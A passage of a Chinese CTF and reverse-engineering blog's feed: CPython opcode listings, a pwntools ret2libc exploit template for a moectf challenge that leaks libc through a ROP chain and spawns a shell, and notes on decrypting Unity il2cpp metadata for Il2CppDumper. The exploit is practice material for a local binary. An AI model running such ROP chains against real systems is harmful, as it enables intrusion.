class="line"></span><br><span class="line"><span class="comment">#define CONTINUE_LOOP   119 /* Start of loop (absolute) */</span></span><br><span class="line"><span class="comment">#define SETUP_LOOP  120 /* Target address (relative) */</span></span><br><span class="line"><span class="comment">#define SETUP_EXCEPT    121 /* &quot;&quot; */</span></span><br><span class="line"><span class="comment">#define SETUP_FINALLY   122 /* &quot;&quot; */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#define LOAD_FAST   124 /* Local variable number */</span></span><br><span class="line"><span class="comment">#define STORE_FAST  125 /* Local variable number */</span></span><br><span class="line"><span class="comment">#define DELETE_FAST 126 /* Local variable number */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#define RAISE_VARARGS   130 /* Number of raise arguments (1, 2 or 3) */</span></span><br><span class="line">/* CALL_FUNCTION_XXX opcodes defined below depend on this definition */</span><br><span class="line"><span class="comment">#define CALL_FUNCTION   131 /* #args + (#kwargs&lt;&lt;8) */</span></span><br><span class="line"><span class="comment">#define MAKE_FUNCTION   132 /* #defaults */</span></span><br><span class="line"><span class="comment">#define BUILD_SLICE     133 /* Number of items */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#define MAKE_CLOSURE    134     /* #free vars */</span></span><br><span class="line"><span class="comment">#define LOAD_CLOSURE    135     /* Load free variable from closure */</span></span><br><span class="line"><span class="comment">#define LOAD_DEREF      136     /* Load and dereference from closure cell */ </span></span><br><span class="line"><span class="comment">#define STORE_DEREF     137     /* Store into cell */ </span></span><br><span class="line"></span><br><span class="line">/* The <span class="built_in">next</span> <span class="number">3</span> opcodes must be contiguous <span class="keyword">and</span> satisfy</span><br><span class="line">   (CALL_FUNCTION_VAR - CALL_FUNCTION) &amp; <span class="number">3</span> == <span class="number">1</span>  */</span><br><span class="line"><span class="comment">#define CALL_FUNCTION_VAR          140  /* #args + (#kwargs&lt;&lt;8) */</span></span><br><span class="line"><span class="comment">#define CALL_FUNCTION_KW           141  /* #args + (#kwargs&lt;&lt;8) */</span></span><br><span class="line"><span class="comment">#define CALL_FUNCTION_VAR_KW       142  /* #args + (#kwargs&lt;&lt;8) */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#define SETUP_WITH 143</span></span><br><span class="line"></span><br><span class="line">/* Support <span class="keyword">for</span> opargs more than <span class="number">16</span> bits long */</span><br><span class="line"><span class="comment">#define EXTENDED_ARG  145</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#define SET_ADD         146</span></span><br><span class="line"><span class="comment">#define MAP_ADD         147</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">enum cmp_op &#123;PyCmp_LT=Py_LT, PyCmp_LE=Py_LE, PyCmp_EQ=Py_EQ, PyCmp_NE=Py_NE, PyCmp_GT=Py_GT, PyCmp_GE=Py_GE,</span><br><span class="line">         PyCmp_IN, PyCmp_NOT_IN, PyCmp_IS, PyCmp_IS_NOT, PyCmp_EXC_MATCH, PyCmp_BAD&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">#define HAS_ARG(op) ((op) &gt;= HAVE_ARGUMENT)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#ifdef __cplusplus</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#endif</span></span><br><span class="line"><span class="comment">#endif /* !Py_OPCODE_H */</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>           <span class="number">2</span> LOAD_CONST               <span class="number">0</span> (<span class="number">0</span>) <span class="comment">//2(地址) LOAD_CONST(操作符)          0 (0)(操作数)</span></span><br><span class="line">            <span class="number">4</span> LOAD_CONST               <span class="number">1</span> (None)</span><br><span class="line">            <span class="number">6</span> IMPORT_NAME              <span class="number">0</span> (crypto)</span><br><span class="line">            <span class="number">8</span> STORE_NAME               <span class="number">0</span> (crypto)</span><br></pre></td></tr></table></figure></div>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;MAGIC_NUMBER&lt;/p&gt;
-&lt;p&gt;&lt;a class=&quot;link&quot;   href=&quot;https://github.com/zrax/pycdc/blob/6467c2cc52aa714876e131a1b6c6cf25f129460f/pyc_module.h#L7&quot; </summary>
-      
-    
-    
-    
-    <category term="python" scheme="http://example.com/categories/python/"/>
-    
-    
-  </entry>
-  
-  <entry>
-    <title>pwn格式</title>
-    <link href="http://example.com/2024/04/12/Pwn/linux/pwn%E6%A0%BC%E5%BC%8F/"/>
-    <id>http://example.com/2024/04/12/Pwn/linux/pwn%E6%A0%BC%E5%BC%8F/</id>
-    <published>2024-04-12T12:51:12.000Z</published>
-    <updated>2024-04-12T12:51:31.000Z</updated>
-    
-    <content type="html"><![CDATA[<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import*</span><br><span class="line">from ctypes import*</span><br><span class="line">elf=ELF(r&quot;/home/wrwrw/vscode/pwn/moectf/ret2libc/pwn&quot;)</span><br><span class="line">dll=</span><br><span class="line">debug=True</span><br><span class="line">if debug==True:</span><br><span class="line">    context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;,terminal=&#x27;bash&#x27;)</span><br><span class="line">    p=process(r&quot;/home/wrwrw/vscode/pwn/moectf/ret2libc/pwn&quot;)</span><br><span class="line">    # pwnlib.gdb.attach(p,&#x27;break main&#x27;)</span><br><span class="line">else:</span><br><span class="line">    p=remote(&quot;127.0.0.1&quot; ,30671 )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__==&#x27;__main__&#x27;:</span><br><span class="line">    puts_got=elf.got[&#x27;puts&#x27;]</span><br><span class="line">    puts_plt=elf.plt[&#x27;puts&#x27;]</span><br><span class="line">    inputs=0x04011E8</span><br><span class="line">    pop_rdi_retn=0x000000000040117e#ROPgadget --binary babyof --only &#x27;pop|ret&#x27; |grep rdi</span><br><span class="line"></span><br><span class="line">    p.sendlineafter(&#x27;But..maybe libc can help u??\n&#x27;,b&#x27;a&#x27;*0x58+p64(pop_rdi_retn)+p64(puts_plt)+p64(puts_plt)+p64(inputs))</span><br><span class="line">    p.recvline()</span><br><span class="line">    a=p.recvline(keepends=False)</span><br><span class="line">    puts=u64(a.ljust(8,b&#x27;\00&#x27;))</span><br><span class="line">    libc=LibcSearcher(&#x27;puts&#x27;,puts)</span><br><span class="line">    base=puts-libc.dump(&#x27;puts&#x27;)#此处是与泄露的got地址相减</span><br><span class="line">    system=base+libc.dump(&#x27;system&#x27;)</span><br><span class="line">    sh=base+libc.dump(&#x27;str_bin_sh&#x27;)</span><br><span class="line">    ret=0x000000000040101a #ROPgadget --binary pwn --only &#x27;ret&#x27;</span><br><span class="line">    p.sendafter(&#x27;But..maybe libc can help u??\n&#x27;,b&#x27;a&#x27;*0x58+p64(ret)+p64(pop_rdi_retn)+p64(sh)+p64(system)+b&#x27;\n&#x27;)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br></pre></td></tr></table></figure></div>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;div class=&quot;highlight-container&quot; data-rel=&quot;Plaintext&quot;&gt;&lt;figure class=&quot;iseeu highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span cla</summary>
-      
-    
-    
-    
-    <category term="Pwn" scheme="http://example.com/categories/Pwn/"/>
-    
-    <category term="linux" scheme="http://example.com/categories/Pwn/linux/"/>
-    
-    
-  </entry>
-  
-  <entry>
-    <title>il2cppdumper</title>
-    <link href="http://example.com/2024/04/03/Re/C#/unity%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91/il2cpp/il2cppdumper/"/>
-    <id>http://example.com/2024/04/03/Re/C#/unity%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91/il2cpp/il2cppdumper/</id>
-    <published>2024-04-03T08:14:49.000Z</published>
-    <updated>2024-04-03T12:07:51.000Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="il2cpp逆向"><a href="#il2cpp逆向" class="headerlink" title="il2cpp逆向"></a>il2cpp逆向</h1><p><a class="link"   href="https://zhuanlan.zhihu.com/p/150555407" >一个Unity游戏保护方案的分析和还原符号信息，偷学对global-metadata保护的思路 - 知乎 (zhihu.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><h2 id="关注方向"><a href="#关注方向" class="headerlink" title="关注方向"></a>关注方向</h2><h3 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h3><p>关注当前文件的<code>GameAssembly.dll</code>(主要函数)和<code>xxxx_Data\il2cpp_data\Metadata\global-metadata.dat</code>(存储符号表以及一些引用)</p><p>现在主要重点集中于加密<code>global-metadata.dat</code>用于防止通过<a class="link"   href="https://github.com/Perfare/Il2CppDumper" >Il2CppDumper <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>逆向出<code>Assembly-CSharp.dll</code>(存储主要逻辑，在il2cpp中用于存放cpp编译为dll的函数调用地址)</p><h3 id="android"><a href="#android" class="headerlink" title="android"></a>android</h3><p>关注当前文件的<code>.\lib\armeabi-v8a\libil2cpp.so</code>(主要函数)和<code>.\assets\bin\Data\Managed\Metadata\global-metadata.dat</code>(存储符号表以及一些引用)</p><p>现在主要重点集中于加密<code>global-metadata.dat</code>用于防止通过<a class="link"   href="https://github.com/Perfare/Il2CppDumper" >Il2CppDumper <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>逆向出<code>Assembly-CSharp.dll</code>(存储主要逻辑，在il2cpp中用于存放cpp编译为dll的函数调用地址)</p><h2 id="解密global-metadata-dat"><a href="#解密global-metadata-dat" class="headerlink" title="解密global-metadata.dat"></a>解密global-metadata.dat</h2><blockquote><p>global-metadata.dat解密基本都基于 程序运行时，需要将global-metadata.dat解密</p></blockquote><h3 id="1、通过dump-memory"><a href="#1、通过dump-memory" class="headerlink" title="1、通过dump memory"></a>1、通过dump memory</h3><h3 id="2、通过逆向加载global-metadata-dat的逻辑"><a href="#2、通过逆向加载global-metadata-dat的逻辑" class="headerlink" title="2、通过逆向加载global-metadata.dat的逻辑"></a>2、通过逆向加载global-metadata.dat的逻辑</h3><blockquote><p>1、搜索对应函数</p><blockquote><p>可通过搜索字符串global-metadata.dat或者Metadata来寻找对应逻辑(程序加载dat时需要对应的路径)</p><p>也可通过查询导入表的<code>MapViewOfFile</code>,因为读取文件时，源码使用的就是这个函数，只不过这个函数使用处较多，需要仔细查找</p></blockquote><p>2、找到加载逻辑</p><blockquote><p>一般形式如下，如果有加密，注意对data的操作</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202404031939459.png"                      alt="image-20240403193938362"                ></p></blockquote><p>3、还原对应global-metadata.dat</p><blockquote><p>注意header位置(0到0x110)</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202404031943377.png"                      alt="image-20240403194313333"                ></p><p>前两个4字节数据为<code>magic number</code>和<code>version</code></p><p>其他都为一类数据的offset和count,注意这类数据是否超过实际文件范围</p></blockquote></blockquote><p>3、通过Il2CppDumper还原逻辑</p><blockquote><p>windows <code>il2CppDumper.exe &quot;.\GameAssembly.dll&quot; &quot;.\xxxx_Data\il2cpp_data\Metadata\global-metadata2.dat&quot; &quot;.\&quot;</code></p><p>android <code>il2CppDumper.exe &quot;.\lib\armeabi-v8a\libil2cpp.so&quot; &quot;.\assets\bin\Data\Managed\Metadata\global-metadata.dat&quot;.\</code></p><p>执行成功后，dump下的目录中<code>script.json</code>保存符号信息</p><p>windows下的<code>GameAssembly.dll</code>android下的<code>libil2cpp.so</code>也存放着函数的具体实现(因为il2cpp本身就是cs转cpp库的操作)可通过 Il2CppDumper目录下的<code>ida_py3.py</code>加载<code>script.json</code>导入对应符号</p><p><code>DummyDll\Assembly-CSharp.dll</code>存放着函数信息</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202404032005785.png"                      alt="image-20240403200512739"                ></p><p>可通过cs逆向工具逆向出对应的VA</p><p>VA可通过ida进行跳转查找对应的逻辑</p></blockquote>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h1 id=&quot;il2cpp逆向&quot;&gt;&lt;a href=&quot;#il2cpp逆向&quot; class=&quot;headerlink&quot; title=&quot;il2cpp逆向&quot;&gt;&lt;/a&gt;il2cpp逆向&lt;/h1&gt;&lt;p&gt;&lt;a class=&quot;link&quot;   href=&quot;https://zhuanlan.zhihu</summary>
-      
-    
-    
-    
-    <category term="Re" scheme="http://example.com/categories/Re/"/>
-    
-    <category term="C#" scheme="http://example.com/categories/Re/C/"/>
-    
-    <category term="unity游戏逆向" scheme="http://example.com/categories/Re/C/unity%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91/"/>
-    
-    <category term="il2cpp" scheme="http://example.com/categories/Re/C/unity%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91/il2cpp/"/>
     
     
   </entry>
